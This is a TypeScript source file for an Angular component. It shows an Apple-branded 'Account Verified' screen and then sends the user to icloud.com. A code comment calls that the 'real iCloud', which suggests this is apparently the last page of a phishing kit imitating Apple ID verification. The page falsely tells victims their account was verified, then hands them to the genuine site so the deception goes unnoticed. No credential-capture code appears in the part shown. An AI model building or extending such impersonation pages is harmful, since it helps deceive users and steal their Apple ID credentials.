import { Component, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';

@Component({
  selector: 'app-apple-success',
  standalone: true,
  imports: [CommonModule],
  template: `
    <div class="apple-flow-container">
      <div class="apple-card">
        <div class="apple-logo-container" style="margin-top: 64px;">
           <div class="success-icon-container">
             <svg viewBox="0 0 52 52" class="checkmark">
               <circle cx="26" cy="26" r="25" fill="none" class="checkmark__circle"/>
               <path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" class="checkmark__check"/>
             </svg>
           </div>
        </div>
        
        <h1 class="apple-title" style="margin-top: 32px;">Account Verified</h1>
        
        <p style="margin-bottom: 48px; font-size: 17px; color: var(--apple-text-secondary); line-height: 1.4;">
          Your Apple ID has been successfully verified. You can now continue using all Apple services.
        </p>
        
        <div style="margin-top: 32px;">
          <button 
            type="button" 
            class="apple-submit-btn" 
            style="width: 200px; border-radius: 12px; font-weight: 500;"
            (click)="finish()"
          >
            Done
          </button>
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/apple.scss'],
  styles: [`
    .success-icon-container {
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      display: block;
      stroke-width: 2;
      stroke: #30d158;
      stroke-miterlimit: 10;
      box-shadow: inset 0px 0px 0px #30d158;
      animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
    }
    .checkmark__circle {
      stroke-dasharray: 166;
      stroke-dashoffset: 166;
      stroke-width: 2;
      stroke-miterlimit: 10;
      stroke: #30d158;
      fill: none;
      animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }
    .checkmark__check {
      transform-origin: 50% 50%;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
    }
    @keyframes stroke {
      100% { stroke-dashoffset: 0; }
    }
    @keyframes scale {
      0%, 100% { transform: none; }
      50% { transform: scale3d(1.1, 1.1, 1); }
    }
    @keyframes fill {
      100% { box-shadow: inset 0px 0px 0px 40px #fff; }
    }
  `]
})
export class AppleSuccessComponent {
  private router = inject(Router);

  finish(): void {
    // Redirect to real iCloud or home
    window.location.href = 'https://www.icloud.com';
  }
}
